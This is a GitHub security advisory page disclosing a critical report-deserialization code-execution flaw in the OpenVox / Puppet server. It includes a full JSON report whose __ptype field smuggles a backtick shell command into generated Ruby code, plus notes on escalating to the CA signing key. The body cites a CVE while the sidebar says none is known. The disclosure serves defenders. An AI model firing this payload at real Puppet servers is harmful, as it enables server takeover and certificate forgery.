+  <h2 class="Box-title h5 color-fg-default">Description</h2>
+</div>
+
+<div class="Box-body tmp-px-5 tmp-pb-5">
+  <div class="markdown-body comment-body p-0" >
+    <h3 dir="auto">Summary</h3>
+<p dir="auto">Authenticated attackers with a OpenVox / Puppet client certificate can cause remote code execution on the OpenVox / Puppet server via a Ruby deserialize vulnerability.</p>
+<h3 dir="auto">Details</h3>
+<p dir="auto">OpenVox / Puppet agents can report “events” to the puppet server via the PUT <code class="notranslate">/puppet/v3/report</code> endpoint. The JSON encoded event will flow into the <code class="notranslate">Puppet::Pops::Serialization::FromDataConverter.convert</code> method located in <a href="https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/transaction/event.rb#L70-L73">puppet/transaction/event.rb</a>. The deserialize will then use <a href="https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/pops/serialization/from_data_converter.rb#L135">type = Types::TypeParser.singleton.parse(type_value, @loader)</a> to read the <code class="notranslate">__ptype</code> and calls <code class="notranslate">.create(value)</code> on the attacker provided type. Eventually, <a href="https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/pops/types/p_object_type.rb#L557">RubyGenerator.new.create_class(self)</a> is called, where  <a href="https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/pops/types/ruby_generator.rb#L66">cls.class_eval(class_def)</a> gives direct code execution on the openvox-server. The following full JSON event can be used to trigger the code execution:</p>
+<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{
+  &quot;host&quot;: &quot;verify-ctrl-node.example.test&quot;,
+  &quot;time&quot;: &quot;2026-09-01T22:30:00.000000000+00:00&quot;,
+  &quot;configuration_version&quot;: 1,
+  &quot;transaction_uuid&quot;: &quot;00000000-0000-0000-0000-0000000000aa&quot;,
+  &quot;report_format&quot;: 12,
+  &quot;puppet_version&quot;: &quot;8.20.0&quot;,
+  &quot;status&quot;: &quot;changed&quot;,
+  &quot;transaction_completed&quot;: true,
+  &quot;noop&quot;: false,
+  &quot;noop_pending&quot;: false,
+  &quot;environment&quot;: &quot;production&quot;,
+  &quot;corrective_change&quot;: false,
+  &quot;logs&quot;: [],
+  &quot;metrics&quot;: {},
+  &quot;resource_statuses&quot;: {
+    &quot;Notify[x]&quot;: {
+      &quot;resource&quot;: &quot;Notify[x]&quot;,
+      &quot;title&quot;: &quot;x&quot;,
+      &quot;resource_type&quot;: &quot;Notify&quot;,
+      &quot;provider_used&quot;: null,
+      &quot;containment_path&quot;: [
+        &quot;Stage[main]&quot;
+      ],
+      &quot;file&quot;: null,
+      &quot;line&quot;: null,
+      &quot;evaluation_time&quot;: 0.001,
+      &quot;change_count&quot;: 1,
+      &quot;out_of_sync_count&quot;: 1,
+      &quot;tags&quot;: [
+        &quot;notify&quot;
+      ],
+      &quot;time&quot;: &quot;2026-09-01T22:30:00.000000000+00:00&quot;,
+      &quot;out_of_sync&quot;: true,
+      &quot;changed&quot;: true,
+      &quot;skipped&quot;: false,
+      &quot;failed&quot;: false,
+      &quot;corrective_change&quot;: false,
+      &quot;events&quot;: [
+        {
+          &quot;__ptype&quot;: &quot;Object[{name =&gt; 'PEP', functions =&gt; {'test' =&gt; {type =&gt; Callable, annotations =&gt; {RubyMethod =&gt; {'body' =&gt; \&quot;1\\n end\\n `/bin/sh -c 'touch /tmp/pwned'`\\n def d2\\n 1\&quot;}}}}}]&quot;,
+          &quot;__pvalue&quot;: &quot;x&quot;
+        }
+      ]
+    }
+  }
+}"><pre class="notranslate">{
+  <span class="pl-ent">"host"</span>: <span class="pl-s"><span class="pl-pds">"</span>verify-ctrl-node.example.test<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"time"</span>: <span class="pl-s"><span class="pl-pds">"</span>2026-09-01T22:30:00.000000000+00:00<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"configuration_version"</span>: <span class="pl-c1">1</span>,
+  <span class="pl-ent">"transaction_uuid"</span>: <span class="pl-s"><span class="pl-pds">"</span>00000000-0000-0000-0000-0000000000aa<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"report_format"</span>: <span class="pl-c1">12</span>,
+  <span class="pl-ent">"puppet_version"</span>: <span class="pl-s"><span class="pl-pds">"</span>8.20.0<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"status"</span>: <span class="pl-s"><span class="pl-pds">"</span>changed<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"transaction_completed"</span>: <span class="pl-c1">true</span>,
+  <span class="pl-ent">"noop"</span>: <span class="pl-c1">false</span>,
+  <span class="pl-ent">"noop_pending"</span>: <span class="pl-c1">false</span>,
+  <span class="pl-ent">"environment"</span>: <span class="pl-s"><span class="pl-pds">"</span>production<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"corrective_change"</span>: <span class="pl-c1">false</span>,
+  <span class="pl-ent">"logs"</span>: [],
+  <span class="pl-ent">"metrics"</span>: {},
+  <span class="pl-ent">"resource_statuses"</span>: {
+    <span class="pl-ent">"Notify[x]"</span>: {
+      <span class="pl-ent">"resource"</span>: <span class="pl-s"><span class="pl-pds">"</span>Notify[x]<span class="pl-pds">"</span></span>,
+      <span class="pl-ent">"title"</span>: <span class="pl-s"><span class="pl-pds">"</span>x<span class="pl-pds">"</span></span>,
+      <span class="pl-ent">"resource_type"</span>: <span class="pl-s"><span class="pl-pds">"</span>Notify<span class="pl-pds">"</span></span>,
+      <span class="pl-ent">"provider_used"</span>: <span class="pl-c1">null</span>,
+      <span class="pl-ent">"containment_path"</span>: [
+        <span class="pl-s"><span class="pl-pds">"</span>Stage[main]<span class="pl-pds">"</span></span>
+      ],
+      <span class="pl-ent">"file"</span>: <span class="pl-c1">null</span>,
+      <span class="pl-ent">"line"</span>: <span class="pl-c1">null</span>,
+      <span class="pl-ent">"evaluation_time"</span>: <span class="pl-c1">0.001</span>,
+      <span class="pl-ent">"change_count"</span>: <span class="pl-c1">1</span>,
+      <span class="pl-ent">"out_of_sync_count"</span>: <span class="pl-c1">1</span>,
+      <span class="pl-ent">"tags"</span>: [
+        <span class="pl-s"><span class="pl-pds">"</span>notify<span class="pl-pds">"</span></span>
+      ],
+      <span class="pl-ent">"time"</span>: <span class="pl-s"><span class="pl-pds">"</span>2026-09-01T22:30:00.000000000+00:00<span class="pl-pds">"</span></span>,
+      <span class="pl-ent">"out_of_sync"</span>: <span class="pl-c1">true</span>,
+      <span class="pl-ent">"changed"</span>: <span class="pl-c1">true</span>,
+      <span class="pl-ent">"skipped"</span>: <span class="pl-c1">false</span>,
+      <span class="pl-ent">"failed"</span>: <span class="pl-c1">false</span>,
+      <span class="pl-ent">"corrective_change"</span>: <span class="pl-c1">false</span>,
+      <span class="pl-ent">"events"</span>: [
+        {
+          <span class="pl-ent">"__ptype"</span>: <span class="pl-s"><span class="pl-pds">"</span>Object[{name =&gt; 'PEP', functions =&gt; {'test' =&gt; {type =&gt; Callable, annotations =&gt; {RubyMethod =&gt; {'body' =&gt; <span class="pl-cce">\"</span>1<span class="pl-cce">\\</span>n end<span class="pl-cce">\\</span>n `/bin/sh -c 'touch /tmp/pwned'`<span class="pl-cce">\\</span>n def d2<span class="pl-cce">\\</span>n 1<span class="pl-cce">\"</span>}}}}}]<span class="pl-pds">"</span></span>,
+          <span class="pl-ent">"__pvalue"</span>: <span class="pl-s"><span class="pl-pds">"</span>x<span class="pl-pds">"</span></span>
+        }
+      ]
+    }
+  }
+}</pre></div>
+<p dir="auto">The above event will execute <code class="notranslate">touch /tmp/pwned</code> as the <code class="notranslate">puppet</code> user on the host or container the OpenVox / Puppet server is running. The backticks in the payload make it trigger during compile/eval time. In configuration with autosign (which is common for enterprise deployment), this is an unauthenticated attack chain to compromise the OpenVox / Puppet server, as a valid cert can be requested via the OpenVox / Puppet client enrollment endpoint. Code execution as <code class="notranslate">puppet</code> gives access to the CA signing key. This allows the attacker to sign a certificates with EKU critical, serverAuth, clientAuth, which could enable direct command execution on other hosts if certain kinds of orchestration is configured.</p>
+<h3 dir="auto">Proof of concept</h3>
+<ul dir="auto">
+<li>Send the above JSON event with a valid client certificate authentication to PUT <code class="notranslate">/puppet/v3/report</code></li>
+<li>Observe the execution of <code class="notranslate">touch /tmp/pwned</code> and the creation of the <code class="notranslate">/tmp/pwned</code> as puppet user</li>
+</ul>
+<h3 dir="auto">Impact</h3>
+<p dir="auto">Code execution on an openvox-server</p>
+<h3 dir="auto">Related</h3>
+<p dir="auto">This vulnerability also affects Puppet Enterprise, including impacts to other integrated components.</p>
+<ul dir="auto">
+<li><code class="notranslate">CVE-2026-115731 – Report Deserialization Code Execution – CVSS 4.0: 9.4 (Critical)</code></li>
+</ul>
+  </div>
+</div>
+
+</div>
+
+  </div>
+</div>
+
+
+
+
+
+</div>
+
+  <div class="col-12 col-md-3 tmp-pl-md-4 tmp-mt-3 tmp-mt-md-0">
+    <div class="discussion-sidebar-item js-repository-advisory-details"  >
+  <h3 data-view-component="true" class="mb-2 tmp-mb-2 f6">Severity</h3>
+    <div data-view-component="true" class="d-flex flex-items-baseline pb-1 tmp-pb-1">
+    <span title="Severity: critical" data-view-component="true" class="Label Label--danger">
+  Critical
+</span>
+
+    <div data-view-component="true" class="lh-condensed d-flex flex-items-baseline ml-2 tmp-ml-2 color-fg-subtle f5">
+      <div style="border-style: none none dashed !important;" data-show-dialog-id="cvss-overall-score-id" data-view-component="true" class="color-fg-default text-semibold border-bottom">
+        <button id="dialog-show-dialog-5973e101-daba-4e10-b691-f1ba4e1243b9" data-show-dialog-id="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9" type="button" data-view-component="true" class="Button--link Button--medium Button color-fg-muted">  <span class="Button-content">
+    <span class="Button-label">9.4</span>
+  </span>
+</button>
+
+<dialog-helper>
+  <dialog id="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9" aria-modal="true" aria-labelledby="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9-title" aria-describedby="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9-description" data-view-component="true" class="Overlay Overlay-whenNarrow Overlay--size-small-portrait Overlay--motion-scaleFade Overlay--full-whenNarrow Overlay--disableScroll">
+    <div data-view-component="true" class="Overlay-header">
+  <div class="Overlay-headerContentWrap">
+    <div class="Overlay-titleWrap">
+      <h1 class="Overlay-title " id="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9-title">
+        CVSS overall score
+      </h1>
+        
+    </div>
+    <div class="Overlay-actionWrap">
+      <button data-close-dialog-id="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9" aria-label="Close" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg></button>
+    </div>
+  </div>
+  
+</div>
+      <scrollable-region data-labelled-by="dialog-5973e101-daba-4e10-b691-f1ba4e1243b9-title">
+        <div data-view-component="true" class="Overlay-body">            <span data-view-component="true" class="text-small">This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).</span>
+</div>
+      </scrollable-region>
+      
+</dialog></dialog-helper>
+</div>      <span class="ml-1">/ 10</span>
+</div></div>
+  <div data-view-component="true" class="d-flex flex-column mt-2 tmp-mt-2 p-2 tmp-p-2 border rounded-2">
+    <h4 data-view-component="true" class="f6 p-1 tmp-p-1 pb-2 tmp-pb-2">CVSS v4 base metrics</h4>
+      <h5 data-view-component="true" class="text-small p-1 tmp-p-1">Exploitability Metrics</h5>
+        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Attack Vector
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">Network</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Attack Complexity
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">Low</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Attack Requirements
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">None</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Privileges Required
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">Low</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          User interaction
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">None</span>
+</div>      <h5 data-view-component="true" class="text-small p-1 tmp-p-1">Vulnerable System Impact Metrics</h5>
+        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Confidentiality
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">High</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Integrity
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">High</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Availability
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">High</span>
+</div>      <h5 data-view-component="true" class="text-small p-1 tmp-p-1">Subsequent System Impact Metrics</h5>
+        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Confidentiality
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">High</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Integrity
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">High</span>
+</div>        <div data-view-component="true" class="d-flex p-1 tmp-p-1 flex-justify-between">
+          Availability
+          <span data-view-component="true" class="color-fg-default text-semibold ml-2 tmp-ml-2">High</span>
+</div>    <div data-view-component="true" class="d-flex p-1 tmp-p-1">
+      <button id="dialog-show-dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1" data-show-dialog-id="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1" type="button" data-view-component="true" class="Button--link Button--medium Button text-left">  <span class="Button-content">
+    <span class="Button-label">Learn more about base metrics</span>
+  </span>
+</button>
+
+<dialog-helper>
+  <dialog id="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1" aria-modal="true" aria-labelledby="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1-title" aria-describedby="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1-description" data-view-component="true" class="Overlay Overlay-whenNarrow Overlay--size-medium-portrait Overlay--motion-scaleFade Overlay--full-whenNarrow Overlay--disableScroll">
+    <div data-view-component="true" class="Overlay-header">
+  <div class="Overlay-headerContentWrap">
+    <div class="Overlay-titleWrap">
+      <h1 class="Overlay-title " id="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1-title">
+        CVSS v4 base metrics
+      </h1>
+        
+    </div>
+    <div class="Overlay-actionWrap">
+      <button data-close-dialog-id="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1" aria-label="Close" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg></button>
+    </div>
+  </div>
+  
+</div>
+      <scrollable-region data-labelled-by="dialog-48aacdea-2b7e-4dd0-bb0a-fc4b6dce0ce1-title">
+        <div data-view-component="true" class="Overlay-body">            <h5 data-view-component="true" class="text-small pb-2 tmp-pb-2 pt-2 tmp-pt-2">Exploitability Metrics</h5>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Attack Vector:</span>
+                <span data-view-component="true" class="text-small">This metric reflects the context by which vulnerability exploitation is possible. This metric value (and consequently the resulting severity) will be larger the more remote (logically, and physically) an attacker can be in order to exploit the vulnerable system. The assumption is that the number of potential attackers for a vulnerability that could be exploited from across a network is larger than the number of potential attackers that could exploit a vulnerability requiring physical access to a device, and therefore warrants a greater severity.</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Attack Complexity:</span>
+                <span data-view-component="true" class="text-small">This metric captures measurable actions that must be taken by the attacker to actively evade or circumvent existing built-in security-enhancing conditions in order to obtain a working exploit. These are conditions whose primary purpose is to increase security and/or increase exploit engineering complexity. A vulnerability exploitable without a target-specific variable has a lower complexity than a vulnerability that would require non-trivial customization. This metric is meant to capture security mechanisms utilized by the vulnerable system.</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Attack Requirements:</span>
+                <span data-view-component="true" class="text-small">This metric captures the prerequisite deployment and execution conditions or variables of the vulnerable system that enable the attack. These differ from security-enhancing techniques/technologies (ref Attack Complexity) as the primary purpose of these conditions is not to explicitly mitigate attacks, but rather, emerge naturally as a consequence of the deployment and execution of the vulnerable system.</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Privileges Required:</span>
+                <span data-view-component="true" class="text-small">This metric describes the level of privileges an attacker must possess prior to successfully exploiting the vulnerability. The method by which the attacker obtains privileged credentials prior to the attack (e.g., free trial accounts), is outside the scope of this metric. Generally, self-service provisioned accounts do not constitute a privilege requirement if the attacker can grant themselves privileges as part of the attack.</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">User interaction:</span>
+                <span data-view-component="true" class="text-small">This metric captures the requirement for a human user, other than the attacker, to participate in the successful compromise of the vulnerable system. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner.</span>
+              </div>
+            <h5 data-view-component="true" class="text-small pb-2 tmp-pb-2 pt-2 tmp-pt-2">Vulnerable System Impact Metrics</h5>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Confidentiality:</span>
+                <span data-view-component="true" class="text-small">This metric measures the impact to the confidentiality of the information managed by the VULNERABLE SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Integrity:</span>
+                <span data-view-component="true" class="text-small">This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the VULNERABLE SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Availability:</span>
+                <span data-view-component="true" class="text-small">This metric measures the impact to the availability of the VULNERABLE SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.</span>
+              </div>
+            <h5 data-view-component="true" class="text-small pb-2 tmp-pb-2 pt-2 tmp-pt-2">Subsequent System Impact Metrics</h5>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Confidentiality:</span>
+                <span data-view-component="true" class="text-small">This metric measures the impact to the confidentiality of the information managed by the SUBSEQUENT SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Integrity:</span>
+                <span data-view-component="true" class="text-small">This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the SUBSEQUENT SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).</span>
+              </div>
+              <div class="pb-2">
+                <span data-view-component="true" class="text-small text-bold">Availability:</span>
+                <span data-view-component="true" class="text-small">This metric measures the impact to the availability of the SUBSEQUENT SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.</span>
+              </div>
+</div>
+      </scrollable-region>
+      
+</dialog></dialog-helper>
+</div></div>  <div data-view-component="true" class="mt-2 tmp-mt-2">CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</div>
+
+</div>
+
+    
+      <div class="discussion-sidebar-item">
+  <h3 data-view-component="true" class="mb-2 tmp-mb-2 f6">CVE ID</h3>
+  <div class="color-fg-muted" >
+    No known CVE
+  </div>
+</div>
+
+    <div class="discussion-sidebar-item js-repository-advisory-details" >
+  <h3 data-view-component="true" class="mb-2 tmp-mb-2 f6">Weaknesses</h3>
+    <div data-view-component="true" class="color-fg-subtle">No CWEs</div>
+</div>
+
+      <div class="js-repository-advisory-details discussion-sidebar-item"  >
+    <h3 aria-label="Advisory Credits" data-view-component="true" class="mb-2 tmp-mb-2 f6">Credits</h3>
+
+    <ul class="list-style-none">
+        <li class="py-1 d-flex flex-justify-between" >
+  <span>
+    <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/alain-neodyme/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/alain-neodyme"><img class="avatar avatar-user" src="https://avatars.githubusercontent.com/u/112960342?s=40&amp;v=4" width="20" height="20" alt="@alain-neodyme" /></a>
+    <a class="Link--primary ml-1 text-bold" data-hovercard-type="user" data-hovercard-url="/users/alain-neodyme/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/alain-neodyme">
+      alain-neodyme</a>  </span>
+
+  <span>
+  <span data-view-component="true" class="Label Label--secondary">Reporter</span>
+
+  </span>
+
+</li>
+
+    </ul>
+  </div>
+
+
+
+
+  </div>
+
+    </div>
+  </div>
+
+
+  </div>
+
+</turbo-frame>
+
+      </main>
+  </div>
+
+  
+            <footer class="footer f6 color-fg-muted color-border-subtle tmp-pt-7 tmp-pb-6 p-responsive" role="contentinfo"  >
+  <h2 class='sr-only'>Footer</h2>
+
+  
+
+
+  <div class="d-flex flex-justify-center flex-items-center flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap">
+    <div class="d-flex flex-items-center flex-shrink-0 mx-2">
+      <a aria-label="GitHub Homepage" class="footer-octicon mr-2" href="https://github.com">
+        <svg aria-hidden="true" data-component="Octicon" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
+    <path d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943"></path>
+</svg>
+</a>
+      <span>
+        &copy; 2026 GitHub,&nbsp;Inc.
+      </span>
+    </div>
+
+    <nav aria-label="Footer">
+      <h3 class="sr-only" id="sr-footer-heading">Footer navigation</h3>
+
+      <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0" aria-labelledby="sr-footer-heading">
+
+
+          <li class="mx-2">
+            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
+          </li>
+
+          <li class="mx-2">
+            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
+          </li>
+
+
+            <li class="mx-2">
+              <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security" data-view-component="true" class="Link--secondary Link">Security</a>
+            </li>
+
+            <li class="mx-2">
+              <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}" href="https://www.githubstatus.com/" data-view-component="true" class="Link--secondary Link">Status</a>
+            </li>
+
+          <li class="mx-2">
+            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to community&quot;,&quot;label&quot;:&quot;text:community&quot;}" href="https://github.community/" data-view-component="true" class="Link--secondary Link">Community</a>
+          </li>
+
+          <li class="mx-2">
+            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com/" data-view-component="true" class="Link--secondary Link">Docs</a>
+          </li>
+
+          <li class="mx-2">
+            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com?tags=dotcom-footer" data-view-component="true" class="Link--secondary Link">Contact</a>
+          </li>
+
+          
+<li class="mx-2" >
+  <cookie-consent-link>
+    <button
+      type="button"
+      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
+      data-action="click:cookie-consent-link#showConsentManagement"
+      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
+    >
+      Manage cookies
+    </button>
+  </cookie-consent-link>
+</li>
+
+  <li class="mx-2">
+    <cookie-consent-link>
+      <button
+        type="button"
+        class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent text-left"
+        data-action="click:cookie-consent-link#showConsentManagement"
+        data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
+      >
+        Do not share my personal information
+      </button>
+    </cookie-consent-link>
+  </li>
+
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+
+    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999"
+      data-locale="en"
+      data-initial-cookie-consent-allowed=""
+      data-cookie-consent-required="false"
+    ></ghcc-consent>
+
+
+
+
+  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
+    <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
